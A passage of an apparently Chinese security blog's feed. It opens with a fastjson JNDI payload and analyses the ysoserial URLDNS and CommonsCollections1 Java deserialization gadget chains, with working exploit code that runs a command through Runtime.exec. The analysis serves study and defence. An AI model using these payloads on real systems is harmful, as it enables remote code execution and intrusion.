&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;span class=&quot;attr&quot;&gt;&quot;@type&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;com.sun.rowset.JdbcRowSetImpl&quot;&lt;/span&gt;,&lt;span class=&quot;attr&quot;&gt;&quot;dataSourceName&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;rmi://localhost:1099/Exploit&quot;&lt;/span&gt;,&lt;span class=&quot;attr&quot;&gt;&quot;autoCommit&quot;&lt;/span&gt;:&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="web" scheme="https://rmb122.com/tags/web/"/>
    
      <category term="java" scheme="https://rmb122.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>ysoserial URLDNS, CommonsCollectionsX 分析</title>
    <link href="https://rmb122.com/2020/01/20/ysoserial-URLDNS-CommonsCollectionsX-%E5%88%86%E6%9E%90/"/>
    <id>https://rmb122.com/2020/01/20/ysoserial-URLDNS-CommonsCollectionsX-%E5%88%86%E6%9E%90/</id>
    <published>2020-01-20T09:45:51.000Z</published>
    <updated>2020-02-04T16:01:44.650Z</updated>
    
    <content type="html"><![CDATA[<p>之前都是 ysoserial 一把梭, 还是得学习 + 复现一下内部实现机制的.</p><a id="more"></a><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>最简单的一个, 这个成因就是 <code>java.util.HashMap</code> 重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.</p><p><img src="https://i.loli.net/2020/01/20/onW3ErpxJT2mK1z.png" alt=""><br><img src="https://i.loli.net/2020/01/20/xJrPjCgF5eh1Kfs.png" alt=""></p><p>而 <code>java.net.URL</code> 的 hashCode 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求.</p><p><img src="https://i.loli.net/2020/01/20/tzER6LIsc125OU7.png" alt=""><br><img src="https://i.loli.net/2020/01/20/53j1fLybKRUHsYV.png" alt="">  </p><p>可以理解为, 在序列化 HashMap 类的对象时, 为了减小序列化后的大小, 并没有将整个哈希表保存进去, 而是仅仅保存了所有内部存储的 key 和 value. 所以在反序列化时, 需要重新计算所有 key 的 hash, 然后与 value 一起放入哈希表中. 而恰好, URL 这个对象计算 hash 的过程中用了 getHostAddress 查询了 URL 的主机地址, 自然需要发出 DNS 请求.</p><p>整条调用链如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">  HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        URL.hashCode()</span><br></pre></td></tr></table></figure><p>URLDNS.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://xxxx.xxx.xxx"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); <span class="comment">// 设一个值, 这样 put 的时候就不会去查询 DNS</span></span><br><span class="line">        hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>); <span class="comment">// hashCode 这个属性不是 transient 的, 所以放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span></span><br><span class="line"></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"out.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><p>这个利用链比较复杂, 借 ysoserial 自带的调用栈先看看吧,  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                AnnotationInvocationHandler.invoke()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>首先是版本受限, 先看 ysoserial 自带的版本检测 (单元测试的时候用的),  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isAnnInvHUniversalMethodImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    JavaVersion v = JavaVersion.getLocalVersion();</span><br><span class="line">    <span class="keyword">return</span> v != <span class="keyword">null</span> &amp;&amp; (v.major &lt; <span class="number">8</span> || (v.major == <span class="number">8</span> &amp;&amp; v.update &lt;= <span class="number">71</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>亲测 u71 实际已经修复了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 中的漏洞, 所以实际上 ysoseiral 检测的是有问题的…  </p><p>应该是 <code>v.update &lt; 71</code> 才对. 在 <code>https://www.oracle.com/technetwork/java/javase/downloads/java-archive-javase8-2177648.html</code> 可以下到老版 jdk.<br>以下代码均以小于 u71 的能下到的最新版本 u66 为例子.</p><p>这个链相对比较复杂, 所以倒着来, 从 <code>LazyMap.get()</code> 开始. </p><p>org.apache.commons.collections.map.LazyMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">        <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 get 这个 map 时, 如果内部的 map 不存在这个 key, 将会调用 <code>this.factory.transform(key)</code>, 将结果作为返回值. 再来看属性定义  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Transformer factory;</span><br></pre></td></tr></table></figure><p>而 Transformer 是一个基类, ChainedTransformer, ConstantTransformer, InvokerTransformer 均继承于此父类. 接下来看如果通过 <code>this.factory.transform(key)</code> 达到 RCE 的效果.  </p><p>org.apache.commons.collections.functors.ChainedTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ChainedTransformer 的作用是将内部的 iTransformers 按顺序都调用一遍. </p><p>org.apache.commons.collections.functors.ConstantTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ConstantTransformer 的作用是不管输入, 直接返回一个常量.</p><p>最后是重点 org.apache.commons.collections.functors.InvokerTransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的作用是调用输入对象的一个方法, 并且参数可控, 这就非常牛逼了, 将这些结合起来, 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/rmb122_pwned"</span>&#125;&#125;),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure><p>这时调用 <code>chainedTransformer.transform</code>, 等价于 <code>java.lang.Runtime.getRuntime().exec(new String[]{&quot;/bin/touch&quot;, &quot;/dev/shm/rmb122_pwned&quot;})</code>,<br>将 chainedTransformer 作为 <code>Lazymap</code> 的 <code>factory</code>, 再 get 一个不存在的 key, 就能达到 RCE 的目的.</p><p>问题就是现在缺少一个在 readObject 时 get 的对象, 而且最好是 jre 内置的. 这里就可以看到作者的牛逼之处, 毕竟这些类可不是随便找找就能找到的.  </p><p>这里看 <code>sun.reflect.annotation.AnnotationInvocationHandler</code> 这个类的 <code>invoke</code> 方法,  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123;</span></span><br><span class="line"></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; paramClass, Map&lt;String, Object&gt; paramMap) &#123;</span><br><span class="line">    Class[] arrayOfClass = paramClass.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (!paramClass.isAnnotation() || arrayOfClass.length != <span class="number">1</span> || arrayOfClass[<span class="keyword">false</span>] != Annotation.class)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AnnotationFormatError(<span class="string">"Attempt to create proxy for a non-annotation type."</span>); </span><br><span class="line">    <span class="keyword">this</span>.type = paramClass;</span><br><span class="line">    <span class="keyword">this</span>.memberValues = paramMap;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object paramObject, Method paramMethod, Object[] paramArrayOfObject)</span> </span>&#123;</span><br><span class="line">    String str = paramMethod.getName();</span><br><span class="line">    Class[] arrayOfClass = paramMethod.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (str.equals(<span class="string">"equals"</span>) &amp;&amp; arrayOfClass.length == <span class="number">1</span> &amp;&amp; arrayOfClass[<span class="keyword">false</span>] == Object.class)</span><br><span class="line">        <span class="keyword">return</span> equalsImpl(paramArrayOfObject[<span class="number">0</span>]); </span><br><span class="line">    <span class="keyword">if</span> (arrayOfClass.length != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(<span class="string">"Too many parameters for an annotation method"</span>); </span><br><span class="line">    <span class="keyword">switch</span> (str) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"toString"</span>:</span><br><span class="line">            <span class="keyword">return</span> toStringImpl();</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"hashCode"</span>:</span><br><span class="line">            <span class="keyword">return</span> Integer.valueOf(hashCodeImpl());</span><br><span class="line">        <span class="keyword">case</span> <span class="string">"annotationType"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object object = <span class="keyword">this</span>.memberValues.get(str); <span class="comment">// &lt;--- 这里调用了 get, 而且 memberValues 也是 Map 类型, 可以把 LazyMap 放在这里</span></span><br><span class="line">    <span class="keyword">if</span> (object == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IncompleteAnnotationException(<span class="keyword">this</span>.type, str); </span><br><span class="line">    <span class="keyword">if</span> (object <span class="keyword">instanceof</span> ExceptionProxy)</span><br><span class="line">        <span class="keyword">throw</span> ((ExceptionProxy)object).generateException(); </span><br><span class="line">    <span class="keyword">if</span> (object.getClass().isArray() &amp;&amp; Array.getLength(object) != <span class="number">0</span>)</span><br><span class="line">        object = cloneArray(object); </span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来看这个类的 <code>readObject</code>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream paramObjectInputStream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    paramObjectInputStream.defaultReadObject();</span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException illegalArgumentException) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">"Non-annotation type in annotation serial stream"</span>);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    Map map = annotationType.memberTypes();</span><br><span class="line">    <span class="keyword">for</span> (Map.Entry entry : <span class="keyword">this</span>.memberValues.entrySet()) &#123;</span><br><span class="line">        String str = (String)entry.getKey();</span><br><span class="line">        Class clazz = (Class)map.get(str);</span><br><span class="line">        <span class="keyword">if</span> (clazz != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object object = entry.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!clazz.isInstance(object) &amp;&amp; !(object <span class="keyword">instanceof</span> ExceptionProxy))</span><br><span class="line">                entry.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(object.getClass() + <span class="string">"["</span> + object + <span class="string">"]"</span>)).setMember((Method)annotationType.members().get(str))); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键点在 <code>this.memberValues.entrySet()</code>, 那么问题来了, 这里又跟 invoke 有什么关系呢.<br>这里涉及到 java 的动态代理机制, 这里不再赘述, 可以理解为调用这个方法实际上调用的是代理的 invoke, 在上面可以看到 AnnotationInvocationHandler 本身继承了 InvocationHandler 且重写了 invoke 方法. 刚好可以拿来利用, 接下来问题就很简单了, exp 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/touch"</span>, <span class="string">"/dev/shm/rmb122_pwned_1"</span>&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"org.apache.commons.collections.map.LazyMap"</span>).getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        Object lazyMap = constructor.newInstance(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 因为构造方法不是 public, 只能通过反射构造出来</span></span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invo = (InvocationHandler) constructor.newInstance(Deprecated.class, lazyMap);</span><br><span class="line">        Object proxy = Proxy.newProxyInstance(invo.getClass().getClassLoader(), <span class="keyword">new</span> Class[]&#123;Map.class&#125;, invo);</span><br><span class="line"></span><br><span class="line">        constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Deprecated.class, proxy);</span><br><span 